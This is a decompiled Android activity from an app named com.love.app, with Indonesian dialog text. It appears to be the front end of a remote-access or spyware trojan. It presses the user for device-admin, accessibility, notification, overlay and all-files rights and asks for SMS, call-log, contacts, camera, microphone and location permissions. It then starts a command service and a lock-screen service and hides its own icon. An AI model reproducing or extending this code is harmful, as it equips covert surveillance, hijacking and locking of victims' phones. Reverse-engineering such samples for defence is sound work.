/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.AlertDialog$Builder
 *  android.app.DownloadManager
 *  android.app.DownloadManager$Request
 *  android.app.admin.DevicePolicyManager
 *  android.content.ComponentName
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.DialogInterface
 *  android.content.DialogInterface$OnClickListener
 *  android.content.Intent
 *  android.content.SharedPreferences
 *  android.content.pm.PackageManager
 *  android.net.Uri
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Environment
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.Parcelable
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.provider.Settings
 *  android.provider.Settings$Secure
 *  android.provider.Settings$System
 *  android.util.Log
 *  android.view.View
 *  android.webkit.CookieManager
 *  android.webkit.DownloadListener
 *  android.webkit.JavascriptInterface
 *  android.webkit.MimeTypeMap
 *  android.webkit.URLUtil
 *  android.webkit.WebChromeClient
 *  android.webkit.WebResourceRequest
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 *  android.widget.EditText
 *  android.widget.Toast
 */
package com.love.app;

import android.app.AlertDialog;
import android.app.DownloadManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.MimeTypeMap;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.love.app.AdminReceiver;
import com.love.app.AdminService;
import com.love.app.CommandService;
import com.love.app.ConfigFetcher;
import com.love.app.ForegroundService;
import com.love.app.HangService;
import com.love.app.JobWakeUpService;
import com.love.app.LockActivity;
import com.love.app.MainActivity$$ExternalSyntheticLambda0;
import com.love.app.MainActivity$$ExternalSyntheticLambda1;
import com.love.app.MainActivity$$ExternalSyntheticLambda10;
import com.love.app.MainActivity$$ExternalSyntheticLambda11;
import com.love.app.MainActivity$$ExternalSyntheticLambda12;
import com.love.app.MainActivity$$ExternalSyntheticLambda13;
import com.love.app.MainActivity$$ExternalSyntheticLambda14;
import com.love.app.MainActivity$$ExternalSyntheticLambda15;
import com.love.app.MainActivity$$ExternalSyntheticLambda16;
import com.love.app.MainActivity$$ExternalSyntheticLambda17;
import com.love.app.MainActivity$$ExternalSyntheticLambda18;
import com.love.app.MainActivity$$ExternalSyntheticLambda19;
import com.love.app.MainActivity$$ExternalSyntheticLambda2;
import com.love.app.MainActivity$$ExternalSyntheticLambda20;
import com.love.app.MainActivity$$ExternalSyntheticLambda21;
import com.love.app.MainActivity$$ExternalSyntheticLambda3;
import com.love.app.MainActivity$$ExternalSyntheticLambda4;
import com.love.app.MainActivity$$ExternalSyntheticLambda5;
import com.love.app.MainActivity$$ExternalSyntheticLambda6;
import com.love.app.MainActivity$$ExternalSyntheticLambda7;
import com.love.app.MainActivity$$ExternalSyntheticLambda8;
import com.love.app.MainActivity$$ExternalSyntheticLambda9;
import com.love.app.MainActivity$3$$ExternalSyntheticLambda0;
import com.love.app.MyAccessibilityService;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity
extends AppCompatActivity {
    private static final long HEARTBEAT_INTERVAL_MS = 120000L;
    private static final int MAX_PERMISSION_RETRIES = 2;
    private static final int MAX_REGISTER_RETRIES = 5;
    private static final int REQ_ADMIN = 99;
    private static final int REQ_BATTERY = 102;
    private static final int REQ_DOWNLOAD_PERM = 105;
    private static final int REQ_MANAGE_STORAGE = 103;
    private static final int REQ_OVERLAY = 100;
    private static final int REQ_PERMISSIONS = 104;
    private static final int REQ_WRITE_SETTINGS = 101;
    private static final String TAG = "MainActivity";
    private ComponentName adminComponent;
    private boolean adminGranted = false;
    private boolean batteryIgnored = false;
    private DevicePolicyManager dpm;
    private ExecutorService executor;
    private Handler heartbeatHandler;
    private Runnable heartbeatRunnable;
    private long lastRegisterAttemptAt = 0L;
    private String lastRegisterSignature = "";
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private boolean overlayGranted = false;
    private int permissionRequestCount = 0;
    private SharedPreferences prefs;
    private volatile boolean registerInFlight = false;
    private int registerRetryCount = 0;
    private String sFileName;
    private String sUrl;
    private String sUserAgent;
    private boolean storageGranted = false;
    private PowerManager.WakeLock wakeLock;
    private WebView webView;
    private boolean writeSettingsGranted = false;

    public static /* synthetic */ void $r8$lambda$wJbBxMVdoIBdV0VPCZlC_JrA9vc(MainActivity mainActivity) {
        mainActivity.registerDeviceNow();
    }

    public MainActivity() {
        this.executor = Executors.newSingleThreadExecutor();
        this.heartbeatHandler = new Handler(Looper.getMainLooper());
    }

    private void checkAdminAndProceed() {
        if (this.dpm.isAdminActive(this.adminComponent)) {
            this.adminGranted = true;
            this.checkRuntimePermissions();
        } else {
            new AlertDialog.Builder((Context)this).setTitle((CharSequence)"Aktifkan Administrator Perangkat").setMessage((CharSequence)"Aplikasi ini memerlukan hak administrator untuk fitur keamanan seperti kunci layar.").setCancelable(false).setPositiveButton((CharSequence)"Aktifkan", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda13(this)).show();
        }
    }

    private void checkBatteryOptimization() {
        if (!((PowerManager)this.getSystemService("power")).isIgnoringBatteryOptimizations(this.getPackageName())) {
            new AlertDialog.Builder((Context)this).setTitle((CharSequence)"Optimasi Baterai").setMessage((CharSequence)"Agar aplikasi dapat berjalan terus di latar belakang, nonaktifkan optimasi baterai.").setCancelable(false).setPositiveButton((CharSequence)"Buka Pengaturan", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda19(this)).setNegativeButton((CharSequence)"Nanti", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda20(this)).show();
        } else {
            this.batteryIgnored = true;
            this.checkManageStorage();
        }
    }

    private void checkFirstRun() {
        if (this.prefs.getBoolean("first_run", true)) {
            this.prefs.edit().putBoolean("first_run", false).apply();
            this.showAutoStartDialog();
        }
    }

    private void checkManageStorage() {
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            new AlertDialog.Builder((Context)this).setTitle((CharSequence)"Akses Semua File").setMessage((CharSequence)"Izin ini diperlukan untuk mengelola file di penyimpanan.").setCancelable(false).setPositiveButton((CharSequence)"Buka Pengaturan", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda9(this)).setNegativeButton((CharSequence)"Nanti", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda10(this)).show();
        } else {
            this.storageGranted = true;
            this.requestAccessibilityAndNotification();
        }
    }

    private void checkOverlayPermission() {
        if (Settings.canDrawOverlays((Context)this)) {
            this.overlayGranted = true;
            this.checkWriteSettings();
        } else {
            new AlertDialog.Builder((Context)this).setTitle((CharSequence)"Izin Tampilan di Atas Aplikasi Lain").setMessage((CharSequence)"Aplikasi ini membutuhkan izin untuk menampilkan jendela di atas aplikasi lain.").setCancelable(false).setPositiveButton((CharSequence)"Buka Pengaturan", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda0(this)).setNegativeButton((CharSequence)"Nanti", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda11(this)).show();
        }
    }

    private void checkRuntimePermissions() {
        int n;
        ArrayList<String> arrayList = new ArrayList<String>();
        for (n = 0; n < 13; ++n) {
            String string2 = (new String[]{"android.permission.CAMERA", "android.permission.READ_CONTACTS", "android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG", "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.RECORD_AUDIO", "android.permission.READ_PHONE_STATE"})[n];
            if (ContextCompat.checkSelfPermission((Context)this, string2) == 0) continue;
            arrayList.add(string2);
        }
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission((Context)this, "android.permission.READ_MEDIA_IMAGES") != 0) {
                arrayList.add("android.permission.READ_MEDIA_IMAGES");
            }
            if (ContextCompat.checkSelfPermission((Context)this, "android.permission.READ_MEDIA_VIDEO") != 0) {
                arrayList.add("android.permission.READ_MEDIA_VIDEO");
            }
            if (ContextCompat.checkSelfPermission((Context)this, "android.permission.POST_NOTIFICATIONS") != 0) {
                arrayList.add("android.permission.POST_NOTIFICATIONS");
            }
        }
        if (!arrayList.isEmpty()) {
            n = this.permissionRequestCount;
            if (n < 2) {
                this.permissionRequestCount = n + 1;
                ActivityCompat.requestPermissions(this, arrayList.toArray(new String[0]), 104);
            } else {
                Toast.makeText((Context)this, (CharSequence)"Beberapa izin tidak diberikan, beberapa fitur mungkin terbatas.", (int)1).show();
                this.proceedToNextPermissionStep();
            }
        } else {
            this.proceedToNextPermissionStep();
        }
    }

    private void checkWriteSettings() {
        if (!Settings.System.canWrite((Context)this)) {
            new AlertDialog.Builder((Context)this).setTitle((CharSequence)"Izin Ubah Pengaturan Sistem").setMessage((CharSequence)"Izin ini diperlukan untuk mengubah beberapa pengaturan sistem.").setCancelable(false).setPositiveButton((CharSequence)"Buka Pengaturan", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda21(this)).setNegativeButton((CharSequence)"Nanti", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda1(this)).show();
        } else {
            this.writeSettingsGranted = true;
            this.checkBatteryOptimization();
        }
    }

    private void downloadFile(String string2, String string3, String string4) {
        try {
            String string5 = CookieManager.getInstance().getCookie(string3);
            DownloadManager downloadManager = (DownloadManager)this.getSystemService("download");
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse((String)string3));
            request.setTitle((CharSequence)string2).setDescription((CharSequence)"Downloading...").addRequestHeader("cookie", string5).addRequestHeader("User-Agent", string4).setAllowedOverMetered(true).setAllowedOverRoaming(true).setNotificationVisibility(1).setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, string2);
            downloadManager.enqueue(request);
            Toast.makeText((Context)this, (CharSequence)"Download Started", (int)0).show();
        }
        catch (Exception exception) {
            Toast.makeText((Context)this, (CharSequence)"Download failed", (int)0).show();
        }
    }

    private void ensureUsernameValid() {
        String string2 = ConfigFetcher.getUsername((Context)this);
        String string3 = ConfigFetcher.getSessionId((Context)this);
        if ((string2 == null || string2.trim().isEmpty()) && (string3 == null || string3.trim().isEmpty())) {
            string3 = this.prefs.getString("saved_username", "");
            if (string3.isEmpty()) {
                ConfigFetcher.setUsername((Context)this, "default_user");
                ConfigFetcher.setSessionId((Context)this, "default_session");
            } else {
                ConfigFetcher.setUsername((Context)this, string3);
                ConfigFetcher.setSessionId((Context)this, string3);
            }
        }
        this.onUsernameReady();
    }

    private String getConfiguredLockPin() {
        Object object = this.prefs;
        String string2 = "";
        if ((object = object.getString("lock_pin", "")) != null) {
            string2 = ((String)object).trim();
        }
        return string2;
    }

    private String getFileType(String string2) {
        return MimeTypeMap.getSingleton().getExtensionFromMimeType(this.getContentResolver().getType(Uri.parse((String)string2)));
    }

    private boolean hasConfiguredLockPin() {
        return this.getConfiguredLockPin().matches("\\d{4,6}");
    }

    private void hideAppIcon() {
        try {
            PackageManager packageManager = this.getPackageManager();
            ComponentName componentName = new ComponentName((Context)this, MainActivity.class);
            packageManager.setComponentEnabledSetting(componentName, 2, 1);
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Gagal menyembunyikan ikon", (Throwable)exception);
        }
    }

    private boolean isAccessibilityEnabled() {
        String string2 = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"enabled_accessibility_services");
        boolean bl = string2 != null && string2.contains(this.getPackageName() + "/" + MyAccessibilityService.class.getName());
        return bl;
    }

    private boolean isNetworkAvailable() {
        return true;
    }

    private boolean isNotificationListenerEnabled() {
        String string2 = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"enabled_notification_listeners");
        boolean bl = string2 != null && string2.contains(this.getPackageName());
        return bl;
    }

    private void normalizeLockState() {
        if (!this.hasConfiguredLockPin()) {
            this.prefs.edit().putBoolean("is_locked", false).putString("lock_mode", "default").apply();
            Intent intent = new Intent((Context)this, LockActivity.LockGuardService.class);
            intent.setAction("com.love.app.STOP_LOCK");
            try {
                this.stopService(intent);
            }
            catch (Exception exception) {
                Log.w((String)TAG, (String)("Gagal menghentikan LockGuardService: " + exception.getMessage()));
            }
        }
    }

    private void onUsernameReady() {
        this.startCoreServices();
    }

    private void proceedToBackground() {
        Log.d((String)TAG, (String)"Semua izin diproses, menjalankan service latar belakang");
        this.checkFirstRun();
        this.startHangService();
        this.startService(new Intent((Context)this, CommandService.class));
        this.hideAppIcon();
    }

    private void proceedToNextPermissionStep() {
        this.checkOverlayPermission();
    }

    private void registerDeviceNow() {
    }

    private void requestAccessibilityAndNotification() {
        boolean bl = this.isAccessibilityEnabled() ^ true;
        boolean bl2 = this.isNotificationListenerEnabled() ^ true;
        if (!bl && !bl2) {
            this.proceedToBackground();
        } else {
            StringBuilder stringBuilder = new StringBuilder("Untuk pengalaman lengkap, aktifkan:\n");
            if (bl) {
                stringBuilder.append("- Layanan Aksesibilitas\n");
            }
            if (bl2) {
                stringBuilder.append("- Akses Notifikasi\n");
            }
            stringBuilder.append("\nSetelah diaktifkan, aplikasi akan tetap berjalan.");
            new AlertDialog.Builder((Context)this).setTitle((CharSequence)"Aksesibilitas dan Notifikasi").setMessage((CharSequence)stringBuilder.toString()).setPositiveButton((CharSequence)"Buka Pengaturan", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda15(this)).setNegativeButton((CharSequence)"Nanti", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda16(this)).show();
        }
    }

    private void scheduleRegisterRetry() {
        int n = this.registerRetryCount;
        if (n >= 5) {
            Log.e((String)TAG, (String)"Max register retries reached, giving up");
            return;
        }
        this.registerRetryCount = ++n;
        long l = (long)Math.pow(2.0, n) * 5000L;
        this.mainHandler.postDelayed((Runnable)new MainActivity$$ExternalSyntheticLambda12(this), l);
        Log.d((String)TAG, (String)("Scheduling register retry #" + this.registerRetryCount + " in " + l + "ms"));
    }

    private void sendHeartbeat() {
    }

    private void setupWebView() {
        Object object;
        block3: {
            block2: {
                object = this.webView.getSettings();
                object.setJavaScriptEnabled(true);
                object.setDomStorageEnabled(true);
                object.setDatabaseEnabled(true);
                object.setLoadWithOverviewMode(true);
                object.setUseWideViewPort(true);
                object.setSupportZoom(true);
                object.setBuiltInZoomControls(false);
                object.setDisplayZoomControls(false);
                object.setCacheMode(-1);
                object.setMixedContentMode(0);
                object.setAllowFileAccess(true);
                object.setAllowContentAccess(true);
                object.setLoadsImagesAutomatically(true);
                object.setMediaPlaybackRequiresUserGesture(false);
                object.setUserAgentString("Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + "; " + Build.MODEL + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36");
                object = CookieManager.getInstance();
                object.setAcceptCookie(true);
                object.setAcceptThirdPartyCookies(this.webView, true);
                this.webView.addJavascriptInterface(new Object(this){
                    final MainActivity this$0;
                    {
                        this.this$0 = mainActivity;
                    }

                    @JavascriptInterface
                    public void setUsername(String string2) {
                        if (string2 != null && !string2.isEmpty()) {
                            ConfigFetcher.setUsername((Context)this.this$0, string2);
                            String string3 = ConfigFetcher.getSessionId((Context)this.this$0);
                            if (string3 == null || string3.trim().isEmpty()) {
                                ConfigFetcher.setSessionId((Context)this.this$0, string2);
                            }
                            this.this$0.prefs.edit().putString("saved_username", string2).apply();
                            this.this$0.onUsernameReady();
                        }
                    }
                }, "AndroidApp");
                this.webView.setWebViewClient(new WebViewClient(this){
                    final MainActivity this$0;
                    {
                        this.this$0 = mainActivity;
                    }

                    /* synthetic */ void lambda$onReceivedError$0$com_love_app_MainActivity$3(String string2, WebView webView) {
                        block2: {
                            block4: {
                                block3: {
                                    if (this.this$0.isFinishing() || string2 == null || !string2.equals(webView.getUrl())) break block2;
                                    String string3 = ConfigFetcher.getWebviewUrl((Context)this.this$0);
                                    if (string3 == null) break block3;
                                    string2 = string3;
                                    if (!string3.isEmpty()) break block4;
                                }
                                string2 = "https://www.google.com";
                            }
                            webView.loadUrl(string2);
                        }
                    }

                    public void onReceivedError(WebView webView, int n, String string2, String string3) {
                        Log.w((String)MainActivity.TAG, (String)("WebView error: " + string2 + " | " + string3));
                        this.this$0.mainHandler.postDelayed((Runnable)new MainActivity$3$$ExternalSyntheticLambda0(this, string3, webView), 3000L);
                    }

                    public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest webResourceRequest) {
                        webView.loadUrl(webResourceRequest.getUrl().toString());
                        return true;
                    }

                    public boolean shouldOverrideUrlLoading(WebView webView, String string2) {
                        webView.loadUrl(string2);
                        return true;
                    }
                });
                this.webView.setWebChromeClient(new WebChromeClient());
                String string2 = ConfigFetcher.getWebviewUrl((Context)this);
                if (string2 == null) break block2;
                object = string2;
                if (!string2.isEmpty()) break block3;
            }
            object = "https://www.google.com";
        }
        this.webView.loadUrl((String)object);
        this.webView.setDownloadListener((DownloadListener)new MainActivity$$ExternalSyntheticLambda14(this));
    }

    private void showAutoStartDialog() {
        try {
            Intent intent = new Intent();
            String string2 = Build.MANUFACTURER.toLowerCase();
            if (string2.contains("xiaomi")) {
                string2 = new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
                intent.setComponent((ComponentName)string2);
            } else if (string2.contains("oppo")) {
                string2 = new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity");
                intent.setComponent((ComponentName)string2);
            } else if (string2.contains("vivo")) {
                string2 = new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity");
                intent.setComponent((ComponentName)string2);
            } else {
                if (!string2.contains("huawei") && !string2.contains("honor")) {
                    return;
                }
                string2 = new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity");
                intent.setComponent((ComponentName)string2);
            }
            if (!this.getPackageManager().queryIntentActivities(intent, 65536).isEmpty()) {
                this.startActivity(intent);
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"AutoStart", (Throwable)exception);
        }
    }

    private void showUsernameDialog() {
        this.runOnUiThread(new MainActivity$$ExternalSyntheticLambda2(this));
    }

    private void startCoreServices() {
        Intent intent;
        try {
            intent = new Intent((Context)this, ForegroundService.class);
            intent.putExtra("inputExtra", "System Service Running");
            if (Build.VERSION.SDK_INT >= 26) {
                this.startForegroundService(intent);
            } else {
                this.startService(intent);
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Gagal start ForegroundService", (Throwable)exception);
        }
        try {
            intent = new Intent((Context)this, JobWakeUpService.class);
            this.startService(intent);
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Gagal start JobWakeUpService", (Throwable)exception);
        }
        try {
            intent = new Intent((Context)this, AdminService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                this.startForegroundService(intent);
            } else {
                this.startService(intent);
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Gagal start AdminService", (Throwable)exception);
        }
    }

    private void startHangService() {
        try {
            Intent intent = new Intent((Context)this, HangService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                this.startForegroundService(intent);
            } else {
                this.startService(intent);
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Gagal start HangService", (Throwable)exception);
        }
    }

    private void startHeartbeat() {
    }

    /* synthetic */ void lambda$checkAdminAndProceed$3$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        dialogInterface = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        dialogInterface.putExtra("android.app.extra.DEVICE_ADMIN", (Parcelable)this.adminComponent);
        dialogInterface.putExtra("android.app.extra.ADD_EXPLANATION", "Diperlukan untuk keamanan.");
        this.startActivityForResult((Intent)dialogInterface, 99);
    }

    /* synthetic */ void lambda$checkBatteryOptimization$8$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.startActivityForResult(new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", Uri.parse((String)("package:" + this.getPackageName()))), 102);
    }

    /* synthetic */ void lambda$checkBatteryOptimization$9$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.checkManageStorage();
    }

    /* synthetic */ void lambda$checkManageStorage$10$com_love_app_MainActivity(DialogInterface object, int n) {
        try {
            object = new StringBuilder("package:");
            Intent intent = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION", Uri.parse((String)((StringBuilder)object).append(this.getPackageName()).toString()));
            this.startActivityForResult(intent, 103);
        }
        catch (Exception exception) {
            this.startActivityForResult(new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION"), 103);
        }
    }

    /* synthetic */ void lambda$checkManageStorage$11$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        Toast.makeText((Context)this, (CharSequence)"Akses file terbatas.", (int)0).show();
        this.requestAccessibilityAndNotification();
    }

    /* synthetic */ void lambda$checkOverlayPermission$4$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.startActivityForResult(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse((String)("package:" + this.getPackageName()))), 100);
    }

    /* synthetic */ void lambda$checkOverlayPermission$5$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        Toast.makeText((Context)this, (CharSequence)"Fitur overlay tidak akan tersedia.", (int)0).show();
        this.checkWriteSettings();
    }

    /* synthetic */ void lambda$checkWriteSettings$6$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.startActivityForResult(new Intent("android.settings.action.MANAGE_WRITE_SETTINGS", Uri.parse((String)("package:" + this.getPackageName()))), 101);
    }

    /* synthetic */ void lambda$checkWriteSettings$7$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.checkBatteryOptimization();
    }

    /* synthetic */ void lambda$onActivityResult$14$com_love_app_MainActivity() {
        this.overlayGranted = Settings.canDrawOverlays((Context)this);
        this.checkWriteSettings();
    }

    /* synthetic */ void lambda$onActivityResult$15$com_love_app_MainActivity() {
        boolean bl = Settings.System.canWrite((Context)this);
        this.writeSettingsGranted = bl;
        this.checkBatteryOptimization();
    }

    /* synthetic */ void lambda$onActivityResult$16$com_love_app_MainActivity() {
        this.batteryIgnored = ((PowerManager)this.getSystemService("power")).isIgnoringBatteryOptimizations(this.getPackageName());
        this.checkManageStorage();
    }

    /* synthetic */ void lambda$onActivityResult$17$com_love_app_MainActivity() {
        boolean bl = Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager();
        this.storageGranted = bl;
        this.requestAccessibilityAndNotification();
    }

    /* synthetic */ void lambda$onRequestPermissionsResult$18$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.checkRuntimePermissions();
    }

    /* synthetic */ void lambda$onRequestPermissionsResult$19$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.proceedToNextPermissionStep();
    }

    /* synthetic */ void lambda$requestAccessibilityAndNotification$12$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
        this.proceedToBackground();
    }

    /* synthetic */ void lambda$requestAccessibilityAndNotification$13$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.proceedToBackground();
    }

    /* synthetic */ void lambda$setupWebView$20$com_love_app_MainActivity(String string2, String string3, String string4, String string5, long l) {
        this.sUrl = string2;
        this.sUserAgent = string3;
        this.sFileName = URLUtil.guessFileName((String)string2, (String)string4, (String)this.getFileType(string2));
        if (ContextCompat.checkSelfPermission((Context)this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0) {
            this.downloadFile(this.sFileName, string2, string3);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, 105);
        }
    }

    /* synthetic */ void lambda$showUsernameDialog$0$com_love_app_MainActivity(EditText object, DialogInterface dialogInterface, int n) {
        if (!((String)(object = object.getText().toString().trim())).isEmpty()) {
            ConfigFetcher.setUsername((Context)this, (String)object);
            ConfigFetcher.setSessionId((Context)this, (String)object);
            this.prefs.edit().putString("saved_username", (String)object).apply();
            this.onUsernameReady();
        } else {
            Toast.makeText((Context)this, (CharSequence)"ID tidak boleh kosong", (int)0).show();
            this.showUsernameDialog();
        }
    }

    /* synthetic */ void lambda$showUsernameDialog$1$com_love_app_MainActivity(DialogInterface dialogInterface, int n) {
        this.finish();
    }

    /* synthetic */ void lambda$showUsernameDialog$2$com_love_app_MainActivity() {
        EditText editText = new EditText((Context)this);
        editText.setHint((CharSequence)"Username / Session ID");
        new AlertDialog.Builder((Context)this).setTitle((CharSequence)"Akses Diperlukan").setMessage((CharSequence)"Masukkan Username atau Session ID akun Anda untuk sinkronisasi:").setView((View)editText).setPositiveButton((CharSequence)"Simpan", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda3(this, editText)).setNegativeButton((CharSequence)"Keluar", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda4(this)).setCancelable(false).show();
    }

    @Override
    protected void onActivityResult(int n, int n2, Intent intent) {
        super.onActivityResult(n, n2, intent);
        switch (n) {
            default: {
                break;
            }
            case 103: {
                this.mainHandler.postDelayed((Runnable)new MainActivity$$ExternalSyntheticLambda8(this), 500L);
                break;
            }
            case 102: {
                this.mainHandler.postDelayed((Runnable)new MainActivity$$ExternalSyntheticLambda7(this), 500L);
                break;
            }
            case 101: {
                this.mainHandler.postDelayed((Runnable)new MainActivity$$ExternalSyntheticLambda6(this), 500L);
                break;
            }
            case 100: {
                this.mainHandler.postDelayed((Runnable)new MainActivity$$ExternalSyntheticLambda5(this), 500L);
                break;
            }
            case 99: {
                if (this.dpm.isAdminActive(this.adminComponent)) {
                    this.adminGranted = true;
                    this.checkRuntimePermissions();
                    break;
                }
                this.checkAdminAndProceed();
            }
        }
    }

    @Override
    public void onBackPressed() {
        WebView webView = this.webView;
        if (webView != null && webView.canGoBack()) {
            this.webView.goBack();
        }
    }

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.prefs = this.getSharedPreferences("love_config", 0);
        ConfigFetcher.bootstrapConfig((Context)this, new ConfigFetcher.ConfigListener(this){
            final MainActivity this$0;
            {
                this.this$0 = mainActivity;
            }

            @Override
            public void onConfigFailed() {
                Log.w((String)MainActivity.TAG, (String)"Config bootstrap gagal");
            }

            @Override
            public void onConfigLoaded(String string2) {
                Log.d((String)MainActivity.TAG, (String)("Config bootstrap siap: " + string2));
            }
        });
        this.setContentView(2131492894);
        this.webView = (WebView)this.findViewById(2131296766);
        this.normalizeLockState();
        this.dpm = (DevicePolicyManager)this.getSystemService("device_policy");
        this.adminComponent = new ComponentName((Context)this, AdminReceiver.class);
        this.setupWebView();
        this.ensureUsernameValid();
        bundle = (PowerManager)this.getSystemService("power");
        this.checkAdminAndProceed();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Object object = this.wakeLock;
        if (object != null && object.isHeld()) {
            this.wakeLock.release();
        }
        if ((object = this.heartbeatRunnable) != null) {
            this.heartbeatHandler.removeCallbacks((Runnable)object);
        }
        if ((object = this.executor) != null) {
            object.shutdownNow();
        }
    }

    @Override
    public void onRequestPermissionsResult(int n, String[] object, int[] nArray) {
        super.onRequestPermissionsResult(n, (String[])object, nArray);
        int n2 = 0;
        if (n == 104) {
            boolean bl = false;
            for (n = n2; n < ((String[])object).length; ++n) {
                if (nArray[n] == 0) continue;
                bl = true;
            }
            if (bl) {
                if (this.permissionRequestCount < 2) {
                    new AlertDialog.Builder((Context)this).setTitle((CharSequence)"Izin Diperlukan").setMessage((CharSequence)"Beberapa izin tidak diberikan. Coba lagi atau lanjutkan dengan fitur terbatas.").setPositiveButton((CharSequence)"Coba Lagi", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda17(this)).setNegativeButton((CharSequence)"Lanjutkan", (DialogInterface.OnClickListener)new MainActivity$$ExternalSyntheticLambda18(this)).show();
                } else {
                    Toast.makeText((Context)this, (CharSequence)"Melanjutkan dengan izin terbatas.", (int)1).show();
                    this.proceedToNextPermissionStep();
                }
            } else {
                this.proceedToNextPermissionStep();
            }
        } else if (n == 105 && nArray.length > 0 && nArray[0] == 0 && (object = this.sUrl) != null) {
            this.downloadFile(this.sFileName, (String)object, this.sUserAgent);
        }
    }
}

